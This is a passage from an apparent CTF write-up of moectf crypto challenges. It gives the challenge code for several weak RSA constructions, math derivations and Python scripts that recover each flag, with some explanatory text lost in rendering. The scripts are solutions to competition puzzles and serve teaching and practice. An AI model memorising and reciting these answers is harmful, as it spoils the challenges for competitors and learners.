class="number">0x2227e398fc6ffcf5159863a345df85ba50d6845f8c06747769fee78f598e7cb1bcf875fb9e5a69ddd39da950f21cb49581c3487c29b7c61da0f584c32ea21ce1edda7f09a6e4c3ae3b4c8c12002bb2dfd0951037d3773a216e209900e51c7d78a0066aa9a387b068acbd4fb3168e915f306ba40</span></span><br><span class="line">key = gmpy2.iroot(<span class="number">4</span>*k, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">l = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">31</span>, <span class="number">61</span>, <span class="number">223</span>, <span class="number">4013</span>, <span class="number">281317</span>, <span class="number">4151351</span>, <span class="number">339386329</span>, <span class="number">370523737</span>, <span class="number">5404604441993</span>,</span><br><span class="line">     <span class="number">26798471753993</span>, <span class="number">25866088332911027256931479223</span>, <span class="number">64889106213996537255229963986303510188999911</span>]</span><br><span class="line">seq = [<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, seq)) <span class="keyword">for</span> seq <span class="keyword">in</span> product(<span class="string">&#x27;01&#x27;</span>, repeat=<span class="number">18</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seq[<span class="number">1</span>:]:</span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        <span class="keyword">if</span> i[j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            flag *= l[j]</span><br><span class="line">    f = long_to_bytes(flag-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;moectf&#123;&#x27;</span> <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(f.decode()+long_to_bytes(key//(flag-<span class="number">1</span>)+<span class="number">1</span>).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;moectf&#123;xxxxxxxxxx&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137</span></span><br><span class="line">e2 = <span class="number">12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m , e1 , e2</span>):</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    N = p*q</span><br><span class="line">    c1 = <span class="built_in">pow</span>((<span class="number">3</span>*p + <span class="number">7</span>*q),e1,N)</span><br><span class="line">    c2 = <span class="built_in">pow</span>((<span class="number">2</span>*p + <span class="number">5</span>*q),e2,N)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    c = <span class="built_in">pow</span>(m , e , N)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypt(m ,e1 , e2))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">N = 107840121617107284699019090755767399009554361670188656102287857367092313896799727185137951450003247965287300048132826912467422962758914809476564079425779097585271563973653308788065070590668934509937791637166407147571226702362485442679293305752947015356987589781998813882776841558543311396327103000285832158267</span></span><br><span class="line"><span class="string">c1 = 15278844009298149463236710060119404122281203585460351155794211733716186259289419248721909282013233358914974167205731639272302971369075321450669419689268407608888816060862821686659088366316321953682936422067632021137937376646898475874811704685412676289281874194427175778134400538795937306359483779509843470045</span></span><br><span class="line"><span class="string">c2 = 21094604591001258468822028459854756976693597859353651781642590543104398882448014423389799438692388258400734914492082531343013931478752601777032815369293749155925484130072691903725072096643826915317436719353858305966176758359761523170683475946913692317028587403027415142211886317152812178943344234591487108474</span></span><br><span class="line"><span class="string">c = 21770231043448943684137443679409353766384859347908158264676803189707943062309013723698099073818477179441395009450511276043831958306355425252049047563947202180509717848175083113955255931885159933086221453965914552773593606054520151827862155643433544585058451821992566091775233163599161774796561236063625305050</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi mathvariant="normal">%</mi><mi>N</mi><mtext></mtext><mi mathvariant="normal">%</mi><mi>q</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">\%N\%q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord">%</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback"></span><span class="mord">%</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mo></mo><msubsup><mi>c</mi><mn>1</mn><msub><mi>e</mi><mn>2</mn></msub></msubsup><mo></mo><mo stretchy="false">(</mo><mn>6</mn><mi>p</mi><mo>+</mo><mn>14</mn><mi>q</mi><msup><mo stretchy="false">)</mo><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mi mathvariant="normal">%</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">2^{e_{1}e_{2}}*c_{1}^{e_{2}}\equiv (6p+14q)^{e_{1}e_{2}}\%q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.266308em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.1449000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">%</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>3</mn><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mo></mo><msubsup><mi>c</mi><mn>2</mn><msub><mi>e</mi><mn>1</mn></msub></msubsup><mo></mo><mo stretchy="false">(</mo><mn>6</mn><mi>p</mi><mo>+</mo><mn>15</mn><mi>q</mi><msup><mo stretchy="false">)</mo><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mi mathvariant="normal">%</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">3^{e_{1}e_{2}}*c_{2}^{e_{1}}\equiv (6p+15q)^{e_{1}e_{2}}\%q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.266308em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.1449000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">%</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mo></mo><msubsup><mi>c</mi><mn>1</mn><msub><mi>e</mi><mn>2</mn></msub></msubsup><mo></mo><msup><mn>3</mn><mrow><msub><mi>e</mi><mn>1</mn></msub><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mo></mo><msubsup><mi>c</mi><mn>2</mn><msub><mi>e</mi><mn>1</mn></msub></msubsup><mo></mo><mn>0</mn><mi mathvariant="normal">%</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">2^{e_{1}e_{2}}*c_{1}^{e_{2}}-3^{e_{1}e_{2}}*c_{2}^{e_{1}}\equiv 0\%q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.266308em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.1449000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.266308em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.1449000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord">%</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">pow</span>(<span class="number">2</span>, e1*e2, N) * <span class="built_in">pow</span>(c1, e2, N)</span><br><span class="line">b = <span class="built_in">pow</span>(<span class="number">3</span>, e1*e2, N) * <span class="built_in">pow</span>(c2, e1, N)</span><br><span class="line">q = GCD(N, a-b)</span><br><span class="line">d = inverse(e, q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, q)).decode())</span><br></pre></td></tr></table></figure><h2 id="more_secure_rsa"><a class="markdownIt-Anchor" href="#more_secure_rsa"></a> More_secure_RSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;moectf&#123;xxxxxxxxxxxxxxxxx&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q </span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Oh,it isn&#x27;t secure enough!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">r = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = n * r</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;C = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 12992001402636687796268040906463852467529970619872166160007439409443075922491126428847990768804065656732371491774347799153093983118784555645908829567829548859716413703103209412482479508343241998746249393768508777622820076455330613128741381912099938105655018512573026861940845244466234378454245880629342180767100764598827416092526417994583641312226881576127632370028945947135323079587274787414572359073029332698851987672702157745794918609888672070493920551556186777642058518490585668611348975669471428437362746100320309846155934102756433753034162932191229328675448044938003423750406476228868496511462133634606503693079</span></span><br><span class="line"><span class="string">n = 16760451201391024696418913179234861888113832949815649025201341186309388740780898642590379902259593220641452627925947802309781199156988046583854929589247527084026680464342103254634748964055033978328252761138909542146887482496813497896976832003216423447393810177016885992747522928136591835072195940398326424124029565251687167288485208146954678847038593953469848332815562187712001459140478020493313651426887636649268670397448218362549694265319848881027371779537447178555467759075683890711378208297971106626715743420508210599451447691532788685271412002723151323393995544873109062325826624960729007816102008198301645376867</span></span><br><span class="line"><span class="string">C = 1227033973455439811038965425016278272592822512256148222404772464092642222302372689559402052996223110030680007093325025949747279355588869610656002059632685923872583886766517117583919384724629204452792737574445503481745695471566288752636639781636328540996436873887919128841538555313423836184797745537334236330889208413647074397092468650216303253820651869085588312638684722811238160039030594617522353067149762052873350299600889103069287265886917090425220904041840138118263873905802974197870859876987498993203027783705816687972808545961406313020500064095748870911561417904189058228917692021384088878397661756664374001122513267695267328164638124063984860445614300596622724681078873949436838102653185753255893379061574117715898417467680511056057317389854185497208849779847977169612242457941087161796645858881075586042016211743804958051233958262543770583176092221108309442538853893897999632683991081144231262128099816782478630830512</span></span><br><span class="line"><span class="string">N = 1582486998399823540384313363363200260039711250093373548450892400684356890467422451159815746483347199068277830442685312502502514973605405506156013209395631708510855837597653498237290013890476973370263029834010665311042146273467094659451409034794827522542915103958741659248650774670557720668659089460310790788084368196624348469099001192897822358856214600885522908210687134137858300443670196386746010492684253036113022895437366747816728740885167967611021884779088402351311559013670949736441410139393856449468509407623330301946032314939458008738468741010360957434872591481558393042769373898724673597908686260890901656655294366875485821714239821243979564573095617073080807533166477233759321906588148907331569823186970816432053078415316559827307902239918504432915818595223579467402557885923581022810437311450172587275470923899187494633883841322542969792396699601487817033616266657366148353065324836976610554682254923012474470450197</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>RSA(</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">r = N//n</span><br><span class="line">d = inverse(e, r-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(C, d, r)))</span><br></pre></td></tr></table></figure><h2 id="ezlegendre"><a class="markdownIt-Anchor" href="#ezlegendre"></a> ezlegendre</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">a = randprime(<span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&#x27;moectf&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    ciphertext = []</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag])</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> plaintext:</span><br><span class="line">        e = randprime(<span class="number">2</span>, p)</span><br><span class="line">        n = 